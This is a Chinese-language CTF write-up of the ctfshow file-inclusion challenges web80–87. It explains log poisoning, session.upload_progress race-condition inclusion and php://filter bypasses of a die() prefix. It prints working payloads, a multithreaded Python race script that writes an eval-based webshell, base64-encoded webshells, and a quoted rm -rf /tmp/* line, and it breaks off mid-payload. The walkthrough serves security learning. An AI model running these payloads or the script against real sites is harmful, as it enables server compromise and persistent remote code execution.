<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();</span><br></pre></td></tr></table></figure>

<p>寻找PHPinfo信息前面的那一段信息即可找到</p>
<p><strong>url的请求也会被包含进去，所以在url中的马没法执行</strong></p>
<p>因为：在get请求的数据会被url编码(<code>**&lt;?**</code>)，在进入PHP之前不解码，所以无法当做PHP代码执行</p>
<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><h3 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="#日志文件包含"></a>#日志文件包含</h3><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730034742978-a281454d-c022-4ef8-b0fb-0949ae243cc3.png" alt="img"></p>
<p>这次居然连：都过滤了，那就不能用伪协议了，我们试一下日志注入</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730034980099-331bfbbb-173e-4fd7-bca3-926bf514ad24.png" alt="img"></p>
<p>发送两次得到文件目录</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035074565-7869069e-1183-4604-b1dc-e2aa014ea974.png" alt="img"></p>
<p>可以看到里面有flag</p>
<h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035246928-fd5d12ee-0eee-47db-a364-201f23135f87.png" alt="img"></p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035297273-eaa66c84-0578-4323-bd02-cec7ece1fd69.png" alt="img"></p>
<p>这次过滤了.符号，意味着日志注入也不可以了，这次只能包含无后缀的文件了，我们php里面无后缀的文件就是session了</p>
<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>Session文件包含是一种常见的安全漏洞，它允许攻击者通过包含恶意代码的Session文件来执行代码。这种漏洞的利用通常涉及到对Session的工作原理有深入的理解，以及对PHP配置和服务器环境的熟悉。</p>
<h4 id="Session的工作原理"><a href="#Session的工作原理" class="headerlink" title="Session的工作原理"></a>Session的工作原理</h4><p>在PHP中，Session是用来保存用户数据的一种方式。当使用<em><strong>session_start()*<strong>函数初始化Session时，PHP会在服务器上的特定路径下创建一个Session文件。这个路径可以在</strong>*php.ini**<em>文件中通过</em></strong>session.save_path*<strong>指定。Session文件通常以</strong></em>sess_***为前缀，后面跟着一个Session ID。当用户再次访问网站时，服务器会通过这个Session ID来找到对应的Session文件，并加载其中的数据。</p>
<h4 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session.upload_progress进行文件包含"></a><strong>利用session.upload_progress进行文件包含</strong></h4><p>在php.ini有以下几个默认选项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>

<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
<p><code>name</code>当它出现在表单中，php将会报告上传进度，<strong>最大的好处是，它的值可控；</strong></p>
<p><code>prefix+name</code>将表示为session中的键名</p>
<p>另外，再添加个session配置中一个重要选项。</p>
<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。</p>
<h4 id="如何创建session文件呢。"><a href="#如何创建session文件呢。" class="headerlink" title="如何创建session文件呢。"></a>如何创建session文件呢。</h4><p>如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
<p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们<strong>在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO</strong>”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_TGAO里。</p>
<h4 id="默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。"><a href="#默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。" class="headerlink" title="默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。"></a>默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。</h4><h4 id="方法一-借助Burp-Suite"><a href="#方法一-借助Burp-Suite" class="headerlink" title="方法一 | 借助Burp Suite"></a>方法一 | 借助Burp Suite</h4><p>可以在本地写一个上传页面，然后抓包添加<code>Cookie: PHPSESSID=AndyNoel</code>，再用BurpSuite爆破，一边不断发包请求包含恶意的session，一边不断发包以维持恶意session存储。这样就可以利用条件竞争把恶意内容留在session里面了。</p>
<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现<code>bug</code>。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。说的通俗一点，条件竞争涉及到的就是操作系统中所提到的进程或者线程同步的问题，当一个程序的运行的结果依赖于线程的顺序，处理不当就会发生条件竞争。</p>
<h4 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h4><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035347028-159bb973-787f-4eb3-9057-2400233642cb.jpeg" alt="img"></p>
<p>开发人员通过检测文件后缀名，设置白名单黑名单各种方式判断用户上传文件是否为危险文件，一旦发现，就会立马发现。同样的，若是我们在判断和删除事件这一时间差内进行一些操作岂不是也会成功？</p>
<h3 id="利用PHP-SESSION-UPLOAD-PROGRESS加条件竞争进行文件包含"><a href="#利用PHP-SESSION-UPLOAD-PROGRESS加条件竞争进行文件包含" class="headerlink" title="利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含"></a>利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</h3><p>1.POST请求上传一个文件并抓包</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730293603142-e3d26032-d061-411c-9f51-7cefb9e3eff1.png" alt="img"></p>
<p>这里我们添加一个 Cookie :PHPSESSID&#x3D;flag ，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_flag” （这里我们猜测session文件默认存储位置为&#x2F;tmp），并在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马，修改如下</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730293746433-317ecf29-87ce-4113-8e0b-291f7f102dc5.png" alt="img"></p>
<p>因为我们在上面这个页面添加的ID值是flag，所以在题目url中传参?file&#x3D;&#x2F;tmp&#x2F;sess_flag并抓包，修改如下：这个a是随便加的，主要是为了方便爆破</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730294322303-0b2b3651-e7a9-48c8-9eef-2708b8cc036a.png" alt="img"></p>
<p>然后将两个数据包都开启爆破，爆破结束后查看长度跟其他差距很大的response包，里面就可以看到回显信息</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730294307149-908a8a99-41f9-4eb5-beaa-34fd37f3b919.png" alt="img"></p>
<p>注意得先进行创建文件的POST包的爆破再进行查看文件的GET包的爆破</p>
<p>后面改一下一句话木马改一下再重复爆破一次就出来flag了</p>
<h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730296283509-f13cd684-5eed-4a7a-9faf-134ddea05039.png" alt="img"></p>
<p>解析一下</p>
<p>session_destroy(): Trying to destroy uninitialized session in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>14</strong></p>
<p>在PHP中，<code>session_destroy()</code>函数用于销毁当前会话中的所有数据，并且会话ID也将不再被使用（除非手动重新生成一个新的会话ID）。然而，如果调用<code>session_destroy()</code>之前没有通过<code>session_start()</code>或其他方式初始化Session，就会出现这个警告。</p>
<p>session_unset()：</p>
<p>释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件。</p>
<p>session_destroy()：</p>
<p>删除当前用户对应的session文件以及释放sessionid</p>
<p>但我们是自己创建的session，而条件竞争使用的是上传那一瞬间创建的 session，所以不影响。继续上一题的方法，但这里我们要另外讲一个方法</p>
<h3 id="用脚本"><a href="#用脚本" class="headerlink" title="用脚本:"></a>用脚本:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://e4da427a-35da-400b-9d08-7134bc8bdb21.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/muma.php&#x27;,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">post 传递内容可在网站目录下写入一句话木马。</span></span><br><span class="line"><span class="string">根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。</span></span><br><span class="line"><span class="string">sessionid 可控，所以这里即 /tmp/sess_ctfshow。</span></span><br><span class="line"><span class="string">这样一旦访问成功，就说明木马植入了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># /tmp/sess_sessionid 中写入一句话木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):  </span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">                <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(</span><br><span class="line">            url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,</span><br><span class="line">            data=data,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 访问木马文件，如果访问到了就代表竞争成功</span></span><br><span class="line">        resposne2=session.get(url+<span class="string">&#x27;muma.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    evnet=threading.Event()</span><br><span class="line">    <span class="comment"># 写入和访问分别设置 5 个线程。</span></span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">    evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730300488029-894f411d-ee24-49ee-92a7-d07d0be5da74.png" alt="img"></p>
<p>出现这个之后代表竞争成功了</p>
<p>我们就可以直接访问这个木马然后进行抓包，用POST提交(或者用蚁剑连接更快)</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730300529394-4081f140-02ec-4af6-9752-0690d78d07a4.png" alt="img"></p>
<p>然后再改成cat fl0g.php就能拿到flag了</p>
<h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730378443258-51ac2e09-3fb8-4d5d-8eab-d0f18e2c08cf.png" alt="img"></p>
<p><strong>system(rm -rf &#x2F;tmp&#x2F;*); 意思是会删除</strong>该命令会删除（<code>rm</code>）<code>/tmp</code>目录下的所有文件和文件夹（<code>*</code>表示所有内容），并且不会询问确认（<code>-f</code>参数表示强制删除），同时递归地删除所有子目录及其内容（<code>-r</code>参数表示递归删除）。</p>
<p>但如果我们用脚本去做的话，由于我们爆破的线程开的比较多，在get的请求线程1刚刚删除&#x2F;tem&#x2F;*，在上传的线程1中又写了进去了。简单来说就是，刚刚删除完就写进去了。所以我们可以正常用脚本去进行爆破</p>
<h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730380946270-8752299b-30ea-48a0-8e64-e2144a8d502b.png" alt="img"></p>
<p>先来了解一下file_get_contents函数和<strong>strpos函数</strong></p>
<h3 id="file-get-contents-函数"><a href="#file-get-contents-函数" class="headerlink" title="file_get_contents()函数"></a>file_get_contents()函数</h3><p> 是 PHP 中的一个非常实用的函数，它用于将整个文件读入一个字符串中。这个函数非常适合于读取小文件或者当你需要将文件内容作为一个字符串来处理时。</p>
<p>用法:<br>$content &#x3D; file_get_contents(‘path&#x2F;to&#x2F;your&#x2F;file.txt’);</p>
<h3 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a><strong>strpos()函数</strong></h3><p><code>strpos</code> 函数是 PHP 中用于查找字符串中特定字符或子字符串首次出现位置的内置函数。</p>
<p>用法:</p>
<p>int strpos ( string $haystack , mixed $needle [, int $offset &#x3D; 0 ] )</p>
<ul>
<li><code>$haystack</code>：目标字符串，即要在其中查找的字符串。</li>
<li><code>$needle</code>：要查找的字符或子字符串。</li>
<li><code>$offset</code>：可选参数，表示从目标字符串的哪个位置开始查找。默认为 0，即从字符串的开头开始查找。</li>
</ul>
<p>好像对题目并没有什么影响，那就继续用</p>
<h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><p>没什么区别，一样可以用脚本去做</p>
<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730390601812-e5d1e52c-e755-433e-abac-2187befdff67.png" alt="img"></p>
<p>需要用GET传入一个参数file和用POST传入一个参数content，后面是对file参数内容的过滤</p>
<p>file_put_contents(urldecode($file), “&lt;?php die(‘大佬别秀了’);?&gt;”.$content);</p>
<ul>
<li>使用<code>file_put_contents</code>函数将字符串写入到由<code>$file</code>指定的文件中。在写入之前，<code>$file</code>经过了<code>urldecode</code>函数处理，这意味着如果文件名是URL编码的，它会被解码。写入的内容首先是<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>，这是一个PHP脚本，当文件被作为PHP执行时会立即终止执行并显示消息”大佬别秀了”。然后是变量<code>$content</code>的值。</li>
</ul>
<p>那么 file_put_contents 函数，将会往 $file 里写入 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 和我们 post 传入的 $content 内容。</p>
<p>这时候我们可以想到file参数被过滤了很多东西，所以我们可以在content参数中传入一句话木马，但由于会同时写入一个die指令，这时候就需要我们去绕过这个死亡函数了</p>
<p>由于这个die()函数的执行没有什么条件，所以还是不太好处理的，于是我就去翻阅了大量wp进行总结</p>
<p>解题方法:</p>
<h3 id="php-filter-流的-base64-decode-方法"><a href="#php-filter-流的-base64-decode-方法" class="headerlink" title="php:&#x2F;&#x2F;filter 流的 base64-decode 方法"></a>php:&#x2F;&#x2F;filter 流的 base64-decode 方法</h3><p>思路:</p>
<p>Base64 编码仅包含 64 个可打印字符，即 A-Z、a-z、0-9、+ 和 &#x2F;。在 PHP 中，当使用 base64_decode 函数解码一个字符串时，如果字符串中包含不在 Base64 字符集中的字符，这些字符将被跳过，只解码合法的 Base64 字符。</p>
<p>所以当题目中 $content 被加上了 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt; </code>，我们可以使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode 先对其进行解码，在解码过程中，字符 &lt;、?、空格、(、’、)、;、&gt;，这些字符不符合 base64 编码的字符范围都将先被移除，最终剩下的用于解码的字符只有 phpdie 和我们 post 传入的内容。由于 Base64 解码是以 4 个字符为一组进行的，这里移除后只剩下 6 个字符，因此我们随便加两个合法字符补全，让其 base64 解码成功，后面再继续传入经过 base64 编码的 payload，也可以被正常解码。</p>
<p>了解完原理就开始做题吧。</p>
<p>由于这里 url 传入的内容本身会进行一次 url 解码，题目中还使用了一个 urldecode 函数，因此 file 传入的内容需要先经过两次 url 编码再传入。</p>
<p>content是写入内容,要进行base64编码 对应上面的伪协议解码,而base解码时,是4个一组,flag.php(要写入的文件),写入的内容中只有phpdie会参与base64解码,因为phpdie只有6个字节,补两个a就是8字节了）（aaPD9waHAgc3lzdGVtKCdscycpOz8+）11是补给前面的 （结果就是phpdie11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;（四个一组）） }else{     highlight_file(<strong>FILE</strong>); }</p>
<p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>
<p>进行二次编码后得到:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>

<p>对 webshell 进行 base64 编码：</p>
<p>webshell：<code>&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;</code></p>
<p>编码后得到:<br>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</p>
<p>注意我们还需要加两个合法字符让前面 base64 解码成功，这里多传入两个1。</p>
<p>post 传入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="number">11</span>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>用hackbar传参</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730392984123-c15ea09a-64a0-487a-90d6-0e1a026c17fd.png" alt="img"></p>
<p>然后调用shell.php，传入cmd</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730393020737-c16d92aa-9fb3-4d03-9965-50bc47f3cf8a.png" alt="img"></p>
<p>最后拿flag就行了</p>
<h3 id="通过-rot13-编码实现绕过"><a href="#通过-rot13-编码实现绕过" class="headerlink" title="通过 rot13 编码实现绕过"></a>通过 rot13 编码实现绕过</h3><p>&lt;?php die(‘大佬别秀了’);?&gt; 经过 rot13 编码会变成 &lt;?cuc qrv(); ?&gt;，如果 php 未开启短标签，则不会认识这段代码，也就不会执行。</p>
<p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;sh.php</p>
<p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;sh.php</p>
<p>两次 url 编码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span 